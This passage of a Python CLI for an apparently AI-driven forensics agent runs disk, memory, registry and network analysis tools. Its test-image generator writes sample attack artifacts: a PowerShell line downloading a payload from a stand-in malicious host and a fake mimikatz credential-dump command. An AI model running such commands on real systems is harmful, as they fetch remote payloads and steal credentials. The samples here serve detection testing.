"""
findevil-cli: Professional command-line interface for the FindEvil DFIR Agent.

Cross-platform (Linux/macOS/Windows) with rich ASCII branding and formatted output.

Usage:
  findevil investigate <evidence> [options]
  findevil serve
  findevil tools
  findevil tool <name> [options]
  findevil create-test-image <output>
  findevil check
"""

import argparse
import asyncio
import json
import logging
import os
import sys
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

try:
    from rich import box
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn
    from rich.syntax import Syntax
    from rich.table import Table
    from rich.text import Text

    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False

try:
    import pyfiglet

    PYFIGLET_AVAILABLE = True
except ImportError:
    PYFIGLET_AVAILABLE = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("findevil-cli")

# ── ASCII Art Engine ──────────────────────────────────────────────


def _generate_logo() -> str:
    """Generate the FindEvil ASCII logo using pyfiglet or built-in art."""
    if PYFIGLET_AVAILABLE:
        try:
            fig = pyfiglet.Figlet(font="big")
            result = fig.renderText("FindEvil")
            if not result.strip():
                fig = pyfiglet.Figlet(font="small")
                result = fig.renderText("FindEvil")
        except Exception:
            result = None
        if result and result.strip():
            return result.rstrip("\n")  # type: ignore[no-any-return]
    # Professional built-in ASCII art — DFIR-themed
    return r"""                           ;
     Et                          ED.
     E#t          L.             E#Wi                       ,;
     E##t     t   EW:        ,ft E###G.                   f#i            t              i
     E#W#t    Ej  E##;       t#E E#fD#W;                .E#t             Ej            LE
     E#tfL.   E#, E###t      t#E E#t t##L              i#W,   t      .DD.E#,          L#E
     E#t      E#t E#fE#f     t#E E#t  .E#K,           L#D.    EK:   ,WK. E#t         G#W.
  ,ffW#Dffj.  E#t E#t D#G    t#E E#t    j##f        :K#Wfff;  E#t  i#D   E#t        D#K.
   ;LW#ELLLf. E#t E#t  f#E.  t#E E#t    :E#K:       i##WLLLLt E#t j#f    E#t       E#K.
     E#t      E#t E#t   t#K: t#E E#t   t##L          .E#L     E#tL#i     E#t     .E#E.
     E#t      E#t E#t    ;#W,t#E E#t .D#W;             f#E:   E#WW,      E#t    .K#E
     E#t      E#t E#t     :K#D#E E#tiW#G.               ,WW;  E#K:       E#t   .K#D
     E#t      E#t E#t      .E##E E#K##i                  .D#; ED.        E#t  .W#G
     E#t      E#t ..         G#E E##D.                     tt t          E#t :W##########Wt
     ;#t      ,;.             fE E#t                                     ,;. :,,,,,,,,,,,,,.
      :;                       , L: """


LOGO = _generate_logo()

LOGO_COMPACT = """
                           ;
     Et                          ED.
     E#t          L.             E#Wi                       ,;
     E##t     t   EW:        ,ft E###G.                   f#i            t              i
     E#W#t    Ej  E##;       t#E E#fD#W;                .E#t             Ej            LE
     E#tfL.   E#, E###t      t#E E#t t##L              i#W,   t      .DD.E#,          L#E
     E#t      E#t E#fE#f     t#E E#t  .E#K,           L#D.    EK:   ,WK. E#t         G#W.
  ,ffW#Dffj.  E#t E#t D#G    t#E E#t    j##f        :K#Wfff;  E#t  i#D   E#t        D#K.
   ;LW#ELLLf. E#t E#t  f#E.  t#E E#t    :E#K:       i##WLLLLt E#t j#f    E#t       E#K.
     E#t      E#t E#t   t#K: t#E E#t   t##L          .E#L     E#tL#i     E#t     .E#E.
     E#t      E#t E#t    ;#W,t#E E#t .D#W;             f#E:   E#WW,      E#t    .K#E
     E#t      E#t E#t     :K#D#E E#tiW#G.               ,WW;  E#K:       E#t   .K#D
     E#t      E#t E#t      .E##E E#K##i                  .D#; ED.        E#t  .W#G
     E#t      E#t ..         G#E E##D.                     tt t          E#t :W##########Wt
     ;#t      ,;.             fE E#t                                     ,;. :,,,,,,,,,,,,,.
      :;                       , L:
"""

# ANSI color sequences for terminal coloring (fallback when rich unavailable)
ANSI_CYAN = "\033[36m"
ANSI_BOLD_CYAN = "\033[1;36m"
ANSI_GREEN = "\033[32m"
ANSI_YELLOW = "\033[33m"
ANSI_RED = "\033[31m"
ANSI_MAGENTA = "\033[35m"
ANSI_BLUE = "\033[34m"
ANSI_RESET = "\033[0m"
ANSI_BOLD = "\033[1m"
ANSI_DIM = "\033[2m"


def _s(s: str, n: int = 500) -> str:
    """Sanitize and truncate a string for safe logging."""
    if not s:
        return ""
    safe = "".join(c for c in s if c.isprintable() or c in "\n\r\t")
    return safe[:n] + "..." if len(safe) > n else safe


def _console() -> Optional[Any]:
    """Get a Rich Console if available, else a simple print wrapper."""
    if RICH_AVAILABLE:
        return Console()
    return None


def _print(*args: Any, **kwargs: Any) -> None:
    """Print with optional rich formatting."""
    console = _console()
    if console:
        console.print(*args, **kwargs)
    else:
        print(*args, **kwargs)


def main() -> None:
    """Main CLI entry point with ASCII logo and rich formatting."""
    parser = argparse.ArgumentParser(
        prog="findevil",
        description="FindEvil — Autonomous DFIR Analysis Agent",
        epilog="Powered by Groq AI | 23 MCP Tools | Cross-Platform",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--version", action="version", version=f"FindEvil Agent v{_get_version()}")
    parser.add_argument("--groq-key", help="Groq API key (or set GROQ_API_KEY env var)")
    parser.add_argument(
        "--evidence-root",
        default=None,
        help="Evidence root directory (default: /evidence or EVIDENCE_ROOT)",
    )
    parser.add_argument(
        "--results-root",
        default=None,
        help="Results root directory (default: /results or RESULTS_ROOT)",
    )
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--no-logo", action="store_true", help="Skip ASCII logo on startup")

    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # ── investigate ──
    inv = subparsers.add_parser(
        "investigate",
        help="Run full automated DFIR investigation",
        description="Analyze evidence autonomously with AI-powered tool selection",
    )
    inv.add_argument("evidence", help="Path to evidence file (disk image, memory dump, pcap)")
    inv.add_argument(
        "--task",
        default="Investigate this evidence for signs of compromise. Find all artifacts and indicators of compromise.",
        help="Natural language task description for the AI",
    )
    inv.add_argument("--output", default=None, help="Output directory for results")
    inv.add_argument(
        "--groq-model", default="llama-3.3-70b-versatile", help="Groq LLM model for AI analysis"
    )
    inv.add_argument(
        "--no-ai", action="store_true", help="Skip AI report generation (tool results only)"
    )
    inv.add_argument(
        "--phase",
        default=None,
        choices=["triage", "filesystem", "artifacts", "memory", "registry", "network", "all"],
        help="Run only a specific phase",
    )
    inv.add_argument("--json", action="store_true", help="Output results as JSON")

    # ── serve ──
    subparsers.add_parser(
        "serve",
        help="Start MCP server for Claude Code / other LLM integration",
        description="Start the Model Context Protocol server for LLM tool integration",
    )

    # ── tools ──
    subparsers.add_parser(
        "tools",
        help="List all available forensic tools",
        description="Display all 23 registered forensic tools with descriptions",
    )

    # ── tool ──
    single = subparsers.add_parser(
        "tool",
        help="Run a single forensic tool directly",
        description="Execute one forensic tool against evidence with full control",
    )
    single.add_argument(
        "tool_name",
        nargs="?",
        default=None,
        help="Name of the tool to run (omit to list available tools)",
    )
    single.add_argument("--image", help="Path to evidence image")
    single.add_argument("--inode", type=int, default=0, help="Inode number")
    single.add_argument("--offset", type=int, default=0, help="Partition offset")
    single.add_argument("--output", help="Output directory (for carve/extract)")
    single.add_argument("--algorithm", default="sha256", help="Hash algorithm")
    single.add_argument("--rules", help="YARA rules file or inline content")
    single.add_argument("--key", help="Registry key path")
    single.add_argument("--filter", help="Display filter for pcap analysis")
    single.add_argument("--json", action="store_true", help="Output as JSON")

    # ── create-test-image ──
    cti = subparsers.add_parser(
        "create-test-image",
        help="Create forensic test image with known artifacts",
        description="Generate a synthetic disk image with embedded IOCs for testing",
    )
    cti.add_argument("output", help="Output path for test image")
    cti.add_argument("--size", type=int, default=50, help="Size in MB (default: 50)")

    # ── ascii-arch ──
    subparsers.add_parser(
        "ascii-arch",
        help="Display ASCII architecture diagram",
        description="Print a professional ASCII art pipeline of the full DFIR analysis workflow",
    )

    # ── check ──
    subparsers.add_parser(
        "check",
        help="Verify all forensic tools are available",
        description="Check environment for required tools, Python modules, and evidence directories",
    )

    # ── correlate ──
    corr = subparsers.add_parser(
        "correlate",
        help="Cross-reference disk image and memory capture",
        description="Correlate findings between disk and memory sources to detect discrepancies",
    )
    corr.add_argument("disk_path", help="Path to disk image (ext2/3/4, raw, dd)")
    corr.add_argument("memory_path", help="Path to memory capture (dump, mem, vmem)")
    corr.add_argument(
        "--output-dir",
        default="/results/correlations",
        help="Output directory for correlation report",
    )
    corr.add_argument(
        "--timeout", type=float, default=60.0, help="Max seconds per analysis (default: 60)"
    )

    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    # Print logo unless suppressed
    if not args.no_logo and args.command:
        _print_logo()

    # Set environment paths
    _set_environment(args)

    # Route to handler
    if args.command == "investigate":
        asyncio.run(_cmd_investigate(args))
    elif args.command == "serve":
        asyncio.run(_cmd_serve())
    elif args.command == "tools":
        asyncio.run(_cmd_tools())
    elif args.command == "tool":
        asyncio.run(_cmd_tool(args))
    elif args.command == "create-test-image":
        _cmd_create_test_image(args)
    elif args.command == "ascii-arch":
        _cmd_ascii_arch()
    elif args.command == "check":
        asyncio.run(_cmd_check())
    elif args.command == "correlate":
        asyncio.run(_cmd_correlate(args))
    else:
        _print_logo()
        parser.print_help()
        sys.exit(1)


def _get_version() -> str:
    """Get version from pyproject.toml or fallback."""
    try:
        from importlib.metadata import version

        return version("findevil-agent")
    except Exception:
        return "2.1.1"


def _print_logo() -> None:
    """Print the ASCII logo with rich gradient/color effects."""
    if RICH_AVAILABLE:
        # Create a gradient-like effect using layered styles
        logo_text = Text(LOGO, style="bold cyan")
        _print(logo_text)
        _print(
            Panel.fit(
                "[bold cyan]Autonomous DFIR Analysis Agent[/bold cyan]\n"
                "[dim]AI-powered digital forensics  ·  23 MCP Tools  ·  Cross-Platform[/dim]",
                border_style="cyan",
                padding=(0, 4),
            )
        )
    else:
        # ANSI-colorized fallback
        print(f"{ANSI_BOLD_CYAN}{LOGO}{ANSI_RESET}")
        print(f"{ANSI_DIM}{'─' * 60}{ANSI_RESET}")
        print(f"{ANSI_CYAN}  Autonomous DFIR Analysis Agent{ANSI_RESET}")
        print(
            f"{ANSI_DIM}  AI-powered digital forensics  |  23 MCP Tools  |  Cross-Platform{ANSI_RESET}"
        )
        print(f"{ANSI_DIM}{'─' * 60}{ANSI_RESET}")


def _set_environment(args: argparse.Namespace) -> None:
    """Set environment variables from args or defaults."""
    os.environ.setdefault("EVIDENCE_ROOT", args.evidence_root or "/evidence")
    os.environ.setdefault("RESULTS_ROOT", args.results_root or "/results")
    if args.groq_key:
        os.environ["GROQ_API_KEY"] = args.groq_key


# ═══════════════════════════════════════════════════════════════════
#  COMMAND HANDLERS
# ═══════════════════════════════════════════════════════════════════


async def _cmd_investigate(args: argparse.Namespace) -> None:
    """Run full automated investigation with rich progress display."""
    evidence_path = args.evidence
    output_dir = args.output or os.path.join(
        os.environ.get("RESULTS_ROOT", "/results"),
        f"investigation_{datetime.now().strftime('%Y%m%d_%H%M%S')}",
    )

    if not Path(evidence_path).exists():
        _print(f"[bold red]❌ Evidence not found:[/bold red] {_s(evidence_path)}")
        sys.exit(1)

    Path(output_dir).mkdir(parents=True, exist_ok=True)
    os.environ["RESULTS_ROOT"] = output_dir

    # Show investigation header
    _print("\n[bold cyan]═══ Investigation ───[/bold cyan]")
    _print(f"  [bold]Evidence:[/bold] {_s(evidence_path, 80)}")
    _print(f"  [bold]Output:[/bold]   {_s(output_dir, 80)}")
    _print(f"  [bold]AI:[/bold]       {'Enabled' if not args.no_ai else 'Disabled'}")
    if not args.no_ai and not os.environ.get("GROQ_API_KEY", ""):
        _print(
            "  [bold yellow]💡 Tip:[/bold yellow] No GROQ_API_KEY found. Add --no-ai to skip AI and run fully offline."
            if RICH_AVAILABLE
            else "  Tip: No GROQ_API_KEY found. Use --no-ai to run fully offline."
        )
    _print(f"  [bold]Phase:[/bold]    {args.phase or 'all phases'}")
    _print()

    from src.agent.groq_client import GroqDFIRClient
    from src.agent.loop import DFIRWorkflow, SimpleMCPClient, ToolCall

    client = SimpleMCPClient()
    try:
        if RICH_AVAILABLE:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                transient=True,
            ) as progress:
                progress.add_task("[cyan]Connecting to MCP server...", total=None)
                await client.start()
        else:
            print("  🔌 Connecting to MCP server...")
            await client.start()

        _print("  [bold green]✅[/bold green] MCP server connected")

        # Initialize Groq if key available
        groq_key = os.environ.get("GROQ_API_KEY", "")
        groq: Optional[GroqDFIRClient] = None
        if groq_key and not args.no_ai:
            try:
                groq = GroqDFIRClient(api_key=groq_key, model=args.groq_model)
                _print(f"  [bold green]✅[/bold green] Groq AI initialized ({groq.model})")
            except Exception as e:
                _print(f"  [bold yellow]⚠️[/bold yellow] Groq init failed: {e}")

        workflow = DFIRWorkflow(client, groq_client=groq)
        workflow._evidence_path = evidence_path

        # Determine phases
        phase_map = {
            "triage": "initial_triage",
            "filesystem": "filesystem_analysis",
            "artifacts": "artifact_extraction",
            "memory": "memory_analysis",
            "registry": "registry_analysis",
            "network": "network_analysis",
        }
        if args.phase and args.phase != "all":
            mapped = phase_map.get(args.phase, args.phase)
            phases_to_run = [mapped]
        else:
            phases_to_run = [
                "initial_triage",
                "filesystem_analysis",
                "artifact_extraction",
                "memory_analysis",
                "registry_analysis",
                "network_analysis",
            ]

        phase_tools = {
            "initial_triage": ["list_evidence", "verify_hash", "fs_filesystem_info"],
            "filesystem_analysis": ["fs_list_files", "fs_file_metadata", "fs_extract_file"],
            "artifact_extraction": ["carve_files", "scan_yara"],
            "memory_analysis": [
                "mem_list_processes",
                "mem_analyze",
                "mem_scan_network",
                "mem_dump_cmdline",
            ],
            "registry_analysis": ["reg_analyze_hive"],
            "network_analysis": ["pcap_analyze", "pcap_list_protocols"],
        }

        all_findings = []
        all_tool_calls = []

        for phase in phases_to_run:
            if phase not in phase_tools:
                _print(f"  [bold yellow]⚠️[/bold yellow] Unknown phase: {phase}")
                continue

            _print(f"\n[bold]── Phase:[/bold] [cyan]{phase}[/cyan]")
            for tool in phase_tools[phase]:
                workflow.state.iteration += 1
                tc = ToolCall(tool, workflow._build_args(tool), workflow.state.iteration)

                try:
                    result = await client.call_tool(tool, tc.arguments)
                    parsed = json.loads(result) if isinstance(result, str) else result
                    tc.success = parsed.get("success", False)
                    tc.duration_ms = parsed.get("duration_ms", 0)
                    tc.result = parsed

                    if tc.success:
                        workflow._extract_findings(tool, parsed)
                        _print(f"  [bold green]✅[/bold green] {tool} ({tc.duration_ms}ms)")
                    else:
                        _print(
                            f"  [bold yellow]⚠️[/bold yellow] {tool}: {str(parsed.get('error', 'unknown'))[:80]}"
                        )
                except Exception as e:
                    tc.error = str(e)
                    _print(f"  [bold red]❌[/bold red] {tool}: {str(e)[:80]}")

                workflow.state.record_call(tc)
                all_tool_calls.append(tc.to_dict())

        all_findings = workflow.state.findings

        # Generate AI report
        report: Optional[dict[str, Any]] = None
        if groq and all_findings:
            _print("\n[bold]── Generating AI Report ───[/bold]")
            try:
                findings_for_report = [f for f in all_findings if f.get("type") != "case_info"]
                report_text = groq.generate_report(
                    findings_for_report,
                    [t.to_dict() for t in workflow.state.tool_calls],
                )
                try:
                    report = json.loads(report_text)
                except json.JSONDecodeError:
                    report = {"raw_report": report_text}
                _print("  [bold green]✅[/bold green] AI report generated")
            except Exception as e:
                _print(f"  [bold yellow]⚠️[/bold yellow] AI report failed: {e}")

        # Build results
        results = {
            "success": True,
            "evidence": evidence_path,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "summary": workflow.state.get_summary(),
            "findings": all_findings,
            "tool_calls": all_tool_calls,
            "report": report or workflow._generate_narrative(),
        }

        # Save results
        results_path = Path(output_dir) / "investigation_result.json"
        with open(results_path, "w") as f:
            json.dump(results, f, indent=2)
        _print(f"\n[bold]📄 Results saved to:[/bold] {results_path}")

        # Print summary
        if args.json:
            _print(
                Syntax(json.dumps(results, indent=2), "json")
                if RICH_AVAILABLE
                else json.dumps(results, indent=2)
            )
        else:
            s = results["summary"]
            _print("\n[bold cyan]═══ Investigation Complete ═══[/bold cyan]")
            _print(
                f"  [bold]Tool calls:[/bold] {s['tool_calls']} "
                f"([green]{s['successful_calls']}[/green] OK, [red]{s['failed_calls']}[/red] failed)"
                if RICH_AVAILABLE
                else f"  Tool calls: {s['tool_calls']} ({s['successful_calls']} OK, {s['failed_calls']} failed)"
            )
            _print(f"  [bold]Findings:[/bold]   {s['findings']}")
            _print(f"  [bold]Duration:[/bold]   {s['elapsed_seconds']}s")
            _print(f"  [bold]Output:[/bold]     {output_dir}")
            if report and isinstance(report, dict) and "summary" in report:
                _print(f"\n  [bold]AI Summary:[/bold] {str(report['summary'])[:200]}...")
            _print("")

    except KeyboardInterrupt:
        _print("\n[bold yellow]⚠️ Investigation interrupted by user[/bold yellow]")
    except Exception as e:
        _print(f"\n[bold red]❌ Investigation failed:[/bold red] {e}")
        raise
    finally:
        await client.stop()


async def _cmd_serve() -> None:
    """Start MCP server."""
    from src.server import main as server_main

    _print(
        "[bold cyan]Starting FindEvil MCP Server...[/bold cyan]"
        if RICH_AVAILABLE
        else "Starting FindEvil MCP Server..."
    )
    await server_main()


async def _cmd_tools() -> None:
    """List all 23 forensic tools with rich formatting."""
    # Standalone tool list (no MCP server needed)
    tools = [
        ("🔍 fs_partition_scan", "Scan partition table using mmls — identify disk layout"),
        ("📂 fs_list_files", "List files/directories via fls — explore filesystem"),
        ("📄 fs_extract_file", "Extract file by inode using icat — recover data"),
        ("ℹ️  fs_file_metadata", "Get inode metadata via istat — timestamps, permissions"),
        ("💽 fs_filesystem_info", "Filesystem stats via fsstat — FS type, size, layout"),
        ("🧩 carve_files", "Carve files by header using foremost — recover deleted"),
        ("🧬 scan_yara", "Scan with YARA rules — malware/pattern detection"),
        ("🔐 verify_hash", "Compute MD5/SHA1/SHA256 hash — integrity check"),
        ("📋 list_evidence", "List evidence directory contents"),
        ("🧠 mem_analyze", "Analyze memory with Volatility 3 — full analysis"),
        ("⚙️  mem_list_processes", "List processes from memory dump — pslist"),
        ("🌐 mem_scan_network", "Scan network connections in memory — netstat"),
        ("📝 mem_dump_cmdline", "Extract process command lines — bash/cmdline"),
        ("🪟 reg_analyze_hive", "Parse Windows Registry hive — SAM, SYSTEM, etc."),
        ("📡 pcap_analyze", "Analyze PCAP with tshark — protocols, conversations"),
        ("🔢 pcap_list_protocols", "List all protocols in PCAP — protocol summary"),
        ("📅 timeline_build", "Build forensic timeline with log2timeline/plaso"),
        ("⏱️  timeline_filter", "Filter/export Plaso timeline — queries, formats"),
        ("🔎 extract_features", "Extract emails, URLs, credit cards via bulk_extractor"),
        ("🎯 benchmark_accuracy", "Run accuracy benchmark against known ground truth"),
        ("📊 get_audit_logs", "Retrieve session audit trail — all tool calls"),
        ("🔄 correlate_evidence", "Cross-reference disk and memory — flag discrepancies"),
    ]

    if RICH_AVAILABLE:
        table = Table(title="FindEvil — 23 Forensic Tools", box=box.ROUNDED)
        table.add_column("Tool", style="cyan", no_wrap=True, width=24)
        table.add_column("Description", style="white")
        for name, desc in tools:
            table.add_row(name, desc)
        _print(table)
        _print("\n[dim]Run: [bold]findevil tool <toolname> --image <path>[/bold] for details[/dim]")
    else:
        print("\n  ╔══════════════════════════════════════════════╗")
        print("  ║  FindEvil — 23 Forensic Tools                ║")
        print("  ╚══════════════════════════════════════════════╝\n")
        for name, desc in tools:
            print(f"  {name}")
            print(f"     {desc}")
            print()


async def _cmd_tool(args: argparse.Namespace) -> None:
    """Run a single forensic tool."""
    tool_name = args.tool_name

    # No tool name provided — show usage hint and bail
    if tool_name is None:
        _print(
            "[bold yellow]Usage:[/bold yellow] findevil tool <tool_name> [options]"
            if RICH_AVAILABLE
            else "Usage: findevil tool <tool_name> [options]"
        )
        _print(
            "[yellow]Example:[/yellow] findevil tool fs_list_files --image /evidence/case.dd"
            if RICH_AVAILABLE
            else "Example: findevil tool fs_list_files --image /evidence/case.dd"
        )
        _print(
            "\n[bold]💡 Run [cyan]findevil tools[/cyan] to list all available forensic tools[/bold]"
            if RICH_AVAILABLE
            else "\nTip: Run 'findevil tools' to list all available tools"
        )
        return

    from src.agent.loop import SimpleMCPClient

    arguments = {}

    if args.image:
        arguments["image_path"] = args.image
    if args.inode:
        arguments["inode"] = args.inode
    if args.offset:
        arguments["offset"] = args.offset
    if args.output:
        arguments["output_dir"] = args.output
    if args.algorithm:
        arguments["algorithm"] = args.algorithm
    if args.rules:
        arguments["rules"] = args.rules
    if args.key:
        arguments["key"] = args.key
    if args.filter:
        arguments["display_filter"] = args.filter

    if tool_name.startswith("mem_") and args.image:
        arguments["memory_path"] = args.image
    if tool_name.startswith("pcap_") and args.image:
        arguments["pcap_path"] = args.image
    if tool_name == "reg_analyze_hive" and args.image:
        arguments["hive_path"] = args.image
    if tool_name == "verify_hash" and args.image:
        arguments["file_path"] = args.image
    if tool_name == "scan_yara" and args.image:
        arguments["target"] = args.image

    client = SimpleMCPClient()
    try:
        await client.start()
        result = await client.call_tool(tool_name, arguments)
        parsed = json.loads(result) if isinstance(result, str) else result

        if args.json:
            _print(
                Syntax(json.dumps(parsed, indent=2), "json")
                if RICH_AVAILABLE
                else json.dumps(parsed, indent=2)
            )
        else:
            success = parsed.get("success", False)
            status = "✅" if success else "❌"
            _print(
                f"\n[bold]{status} {tool_name}[/bold]"
                if RICH_AVAILABLE
                else f"\n{status} {tool_name}"
            )

            if not success:
                _print(
                    f"  [bold red]Error:[/bold red] {parsed.get('error', 'Unknown error')}"
                    if RICH_AVAILABLE
                    else f"  Error: {parsed.get('error', 'Unknown error')}"
                )
            else:
                for key in ["match_count", "file_count", "packet_count", "partition_count", "hash"]:
                    if key in parsed:
                        _print(f"  {key}: {parsed[key]}")
                if parsed.get("duration_ms"):
                    _print(f"  Time: {parsed['duration_ms']}ms")
    finally:
        await client.stop()


def _cmd_create_test_image(args: argparse.Namespace) -> None:
    """Create a forensic test image with known artifacts."""
    output = args.output
    size_mb = args.size

    _print(
        f"[bold]Creating test image:[/bold] {output} ({size_mb}MB)"
        if RICH_AVAILABLE
        else f"Creating test image: {output} ({size_mb}MB)"
    )

    import subprocess as sp

    # Create empty image
    sp.run(["dd", "if=/dev/zero", f"of={output}", "bs=1M", f"count={size_mb}"], capture_output=True)

    result = sp.run(["mkfs.ext2", "-F", output], capture_output=True, text=True)
    if result.returncode != 0:
        logger.error(f"Failed to format: {result.stderr}")
        sys.exit(1)

    # Create known indicator files
    commands = [
        "mkdir /Users",
        "mkdir /Users/Admin",
        "mkdir /Users/Admin/Downloads",
        "mkdir /Documents",
        "mkdir /Windows",
        "mkdir /Windows/System32",
        "mkdir /Windows/System32/config",
    ]

    for cmd in commands:
        sp.run(["debugfs", "-w", "-R", cmd, output], capture_output=True)

    echo_cmds = [
        (
            "write /dev/stdin /hello.txt",
            "Hello from Find Evil! Test file for DFIR analysis.\n"
            "Suspicious activity at 2026-06-01 03:14:15 UTC\n"
            "Malicious payload: C:\\Windows\\malware.exe\n"
            "Registry key: HKLM\\SYSTEM\\CurrentControlSet\\Services\\malware\n"
            "Network: 192.168.1.100:4444\n",
        ),
        (
            "write /dev/stdin /Users/Admin/Downloads/evil.ps1",
            "# PowerShell payload\nInvoke-WebRequest -Uri http://malware.evil.com/payload\n",
        ),
        (
            "write /dev/stdin /Users/Admin/Downloads/mimikatz_log.txt",
            "mimikatz: sekurlsa::logonpasswords\nAdmin:CORP:aad3b435b51404ee\n",
        ),
        (
            "write /dev/stdin /Windows/System32/config/SAM",
            "This is a SAM registry hive (simulated)\n",
        ),
    ]

    for wr_cmd, content in echo_cmds:
        sp.run(
            ["debugfs", "-w", "-R", wr_cmd, output], input=content, capture_output=True, text=True
        )

    _print(
        f"\n[bold green]✅ Test image created:[/bold green] {output} ({size_mb}MB)"
        if RICH_AVAILABLE
        else f"\n✅ Test image created: {output} ({size_mb}MB)"
    )
    _print("   Contains: hello.txt (IOCs), evil.ps1 (malicious script),")
    _print("   mimikatz_log.txt (credential dump), simulated SAM hive")


def _cmd_ascii_arch() -> None:
    """Display ASCII architecture diagram."""
    arch = r"""
  ╔═══════════════════════════════════════════════════════════════╗
  ║               FindEvil — DFIR Architecture                    ║
  ╚═══════════════════════════════════════════════════════════════╝

  ┌─────────────────┐    ┌─────────────────┐    ┌─────────────────┐
  │   💻 findevil    │    │   🔌 MCP Server  │    │   🤖 Claude/LLM │
  │   Rich CLI App   │───▶│   21 Tools API   │───▶│   MCP Client    │
  └─────────────────┘    └─────────────────┘    └─────────────────┘
                                 │
                                 ▼
  ┌───────────────────────────────────────────────────────────────┐
  │              🧠 Groq AI Engine (Llama 3.3 70B)                │
  │   Tool orchestration · Finding correlation · Report gen       │
  └───────────────────────────────────────────────────────────────┘
                                 │
                                 ▼
  ┌───────┐   ┌───────┐   ┌───────┐   ┌───────┐   ┌───────┐   ┌───────┐
  │Phase 1│──▶│Phase 2│──▶│Phase 3│──▶│Phase 4│──▶│Phase 5│──▶│Phase 6│
  │Triage │   │  FS   │   │Carving│   │Memory │   │Registry│   │Network│
  └───────┘   └───────┘   └───────┘   └───────┘   └───────┘   └───────┘
                                 │
                                 ▼
  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │ sleuthkit│   │Volatility│   │  regipy  │   │  tshark  │   │  YARA+   │
  │ TSK tools│   │  Memory  │   │ Registry │   │  PCAP    │   │ Foremost │
  └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘

  ╔═══════════════════════════════════════════════════════════════╗
  ║  Evidence: Disk Images · Memory Dumps · PCAPs · Hives        ║
  ║  Output:   Structured JSON · AI Narrative · Audit Trail      ║
  ║  Version:  v2.1.1  · 21 Tools  · 96 Tests  · Cross-Platform  ║
  ╚═══════════════════════════════════════════════════════════════╝
"""
    if RICH_AVAILABLE:
        _print(f"[cyan]{arch}[/cyan]")
    else:
        print(f"{ANSI_CYAN}{arch}{ANSI_RESET}")


async def _cmd_check() -> None:
    """Check environment with rich formatting."""
    if RICH_AVAILABLE:
        _print(
            Panel.fit(
                "[bold cyan]FindEvil — Environment Check[/bold cyan]\n"
                "Verifying forensic tools, Python modules, and configuration",
                border_style="cyan",
            )
        )
    else:
        _print("\n🔍 FindEvil — Environment Check\n")

    from src.tools.tool_resolver import find_tools

    required_tools = {
        "fls": "TSK — file listing",
        "icat": "TSK — file extraction",
        "mmls": "TSK — partition scanning",
        "fsstat": "TSK — filesystem stats",
        "istat": "TSK — inode metadata",
        "foremost": "File carving",
        "yara": "Pattern matching",
        "tshark": "Packet analysis",
        "sha256sum": "SHA256 hashing",
        "strings": "String extraction",
        "debugfs": "ext2/3/4 debugging",
    }

    python_modules = {
        "fastmcp": "MCP Server framework",
        "pydantic": "Data validation",
        "groq": "Groq AI API client",
        "volatility3": "Memory forensics",
        "regipy": "Windows Registry parser",
    }

    all_ok = True

    # System tools
    if RICH_AVAILABLE:
        tool_table = Table(title="System Tools", box=box.SIMPLE)
        tool_table.add_column("Tool", style="cyan")
        tool_table.add_column("Status", no_wrap=True)
        tool_table.add_column("Location", style="dim")
    else:
        print("── System Tools ──")

    found_tools = find_tools(*required_tools.keys())
    for tool, desc in required_tools.items():
        path = found_tools.get(tool)
        if RICH_AVAILABLE:
            status = "[green]✅[/green] found" if path else "[red]❌[/red] NOT FOUND"
            tool_table.add_row(tool, status, str(path or desc))
        else:
            if path:
                print(f"  ✅ {tool:15s} found at {path}")
            else:
                print(f"  ❌ {tool:15s} NOT FOUND — {desc}")
                all_ok = False

    if RICH_AVAILABLE:
        _print(tool_table)

    # Python modules
    if RICH_AVAILABLE:
        mod_table = Table(title="Python Modules", box=box.SIMPLE)
        mod_table.add_column("Module", style="cyan")
        mod_table.add_column("Status", no_wrap=True)
        mod_table.add_column("Version", style="dim")
    else:
        print("\n── Python Modules ──")

    for mod, desc in python_modules.items():
        try:
            imported = __import__(mod)
            ver = getattr(imported, "__version__", "✓")
            if RICH_AVAILABLE:
                mod_table.add_row(mod, "[green]✅[/green] installed", str(ver))
            else:
                print(f"  ✅ {mod:15s} installed ({ver})")
        except ImportError:
            if RICH_AVAILABLE:
                mod_table.add_row(mod, "[red]❌[/red] NOT INSTALLED", desc)
            else:
                print(f"  ❌ {mod:15s} NOT INSTALLED — {desc}")
            all_ok = False

    if RICH_AVAILABLE:
        _print(mod_table)

    # Evidence directories
    ev_root = Path(os.environ.get("EVIDENCE_ROOT", "/evidence"))
    res_root = Path(os.environ.get("RESULTS_ROOT", "/results"))

    if RICH_AVAILABLE:
        dir_table = Table(title="Directories", box=box.SIMPLE)
        dir_table.add_column("Path", style="cyan")
        dir_table.add_column("Status")
    else:
        print("\n── Directories ──")

    for d in [ev_root, res_root]:
        exists = d.exists()
        status = "[green]✅[/green] exists" if exists else "[yellow]⚠️[/yellow] will be created"
        if RICH_AVAILABLE:
            dir_table.add_row(str(d), status)
        else:
            print(f"  {'✅' if exists else '⚠️'} {str(d)}")
    if RICH_AVAILABLE:
        _print(dir_table)

    # Groq key
    groq_key = os.environ.get("GROQ_API_KEY", "")
    if RICH_AVAILABLE:
        _print(
            f"\n[bold]Groq API:[/bold] {'[green]✅ Set[/green]' if groq_key else '[yellow]⚠️ Not set[/yellow] — AI features disabled'}"
        )
        if not groq_key:
            _print("  Get a key: [blue]https://console.groq.com[/blue]")
    else:
        print("\n── Groq API Key ──")
        if groq_key:
            print(f"  ✅ GROQ_API_KEY set ({groq_key[:20]}...)")
        else:
            print("  ⚠️ GROQ_API_KEY not set — AI features disabled")

    # Final verdict
    _print()
    if RICH_AVAILABLE:
        if all_ok:
            _print(
                Panel.fit(
